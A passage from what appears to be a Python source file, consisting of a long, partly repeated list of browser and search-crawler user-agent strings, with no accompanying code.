               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)',
               'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)',
               'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
               'AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)',
               'Mozilla/5.0 (compatible; MSIE 9.0; AOL 9.7; AOLBuild 4343.19; Windows NT 6.1; WOW64; Trident/5.0; FunWebProducts)',
               'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.27; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.21; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)',
               'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; GTB7.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)',
               'Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
               'Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57',
               'Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
               'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0',
               'Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g',
               'Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125',
               'Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)',
               'Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)',
               'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
               'Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)',
               'Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)',
               'Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10',
               'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0',
               'Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10',
               'Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)',
               'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)',
               'Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)',
               'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)',
               'Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16',
               'Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)',
               'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)',
               'Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7',
               'BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0',
               'Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)',
               'Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)',
               'Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10',
               'Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)',
               'Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007',
               'BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
               'Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57',
               'Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
               'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0',
               'Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g',
               'Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125',
               'Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)',
               'Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)',
               'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
               'Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)',
               'Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)',
               'Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10',
               'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0',
               'Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10',
               'Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)',
               'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)',
               'Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)',
               'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)',
               'Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16',
               'Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)',
               'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)',
               'Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7',
               'BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0',
               'Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)',
               'Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)',
               'Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10',
               'Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)',
               'Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007',
               'BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179',
               'Mozilla/5.0 (compatible; 008/0.83; http://www.80legs.com/webcrawler.html) Gecko/2008032620',
               'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0) AddSugarSpiderBot www.idealobserver.com',
               'Mozilla/5.0 (compatible; AnyApexBot/1.0; +http://www.anyapex.com/bot.html)',
               'Mozilla/4.0 (compatible; Arachmo)', 'Mozilla/4.0 (compatible; B-l-i-t-z-B-O-T)',
               'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)',
               'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)',
               'Mozilla/5.0 (compatible; BecomeBot/2.3; MSIE 6.0 compatible; +http://www.become.com/site_owners.html)',
               'BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)',
               'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
               'Sqworm/2.9.85-BETA (beta_release; 20011115-775; i686-pc-linux-gnu)',
               'Mozilla/5.0 (compatible; YandexImages/3.0; +http://yandex.com/bots)',
               'Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)',
               'Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )',
               'Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )',
               'Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)',
               'Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.dlc@looksmart.net; http://www.WISEnutbot.com)',
               'Mozilla/4.0 compatible ZyBorg/1.0 (wn-16.zyborg@looksmart.net; http://www.WISEnutbot.com)',
               'Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)',
               'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser 1.98.744; .NET CLR 3.5.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; Acoo Browser; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; Avant Browser)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser; GTB6; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; InfoPath.1; .NET CLR 3.5.30729; .NET CLR 3.0.30618)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Acoo Browser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/419 (KHTML, like Gecko, Safari/419.3) Cheshire/1.0.ALPHA',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) ChromePlus/4.0.222.3 Chrome/4.0.222.3 Safari/532.2',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.215 Safari/534.10 ChromePlus/1.5.1.1',
               'Links (2.7; Linux 3.7.9-2-ARCH x86_64; GNU C 4.7.1; text)',
               'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A',
               'Mozilla/5.0 (PLAYSTATION 3; 3.55)', 'Mozilla/5.0 (PLAYSTATION 3; 2.00)',
               'Mozilla/5.0 (PLAYSTATION 3; 1.00)',
               'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:24.0) Gecko/20100101 Thunderbird/24.4.0',
               'Mozilla/5.0 (compatible; AbiLogicBot/1.0; +http://www.abilogic.com/bot.html)',
               'SiteBar/3.3.8 (Bookmark Server; http://sitebar.org/)',
               'iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)',
               'iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)',
               'Mozilla/4.0 (compatible; WebCapture 3.0; Macintosh)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (FM Scene 4.6.1)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (.NET CLR 3.5.30729) (Prevx 3.0.5) ',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.1.8) Gecko/20071004 Iceweasel/2.0.0.8 (Debian-2.0.0.6+2.0.0.8-Oetch1)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; {1C69E7AA-C14E-200E-5A77-8EAB2D667A07})',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; acc=baadshah; acc=none; freenet DSL 1.1; (none))',
               'Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 8.51',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; snprtz|S26320700000083|2600#Service Pack 1#2#5#154321|isdn)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Alexa Toolbar; mxie; .NET CLR 1.1.4322)',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; ja-jp) AppleWebKit/417.9 (KHTML, like Gecko) Safari/417.8',
               'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.12) Gecko/20051010 Firefox/1.0.7 (Ubuntu package 1.0.7)',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)',
               'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)',
               'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
               'Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57',
               'Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
               'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0',
               'Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g',
               'Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125',
               'Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)',
               'Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)',
               'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
               'Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)',
               'Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)',
               'Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10',
               'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0',
               'Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10',
               'Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)',
               'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)',
               'Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)',
               'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)',
               'Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16',
               'Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)',
               'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)',
               'Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7',
               'BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0',
               'Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)',
               'Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)',
               'Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10',
               'Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)',
               'Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007',
               'BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179',
               'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)',
               'Googlebot/2.1 (http://www.googlebot.com/bot.html)', 'Opera/9.20 (Windows NT 6.0; U; en)',
               'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)',
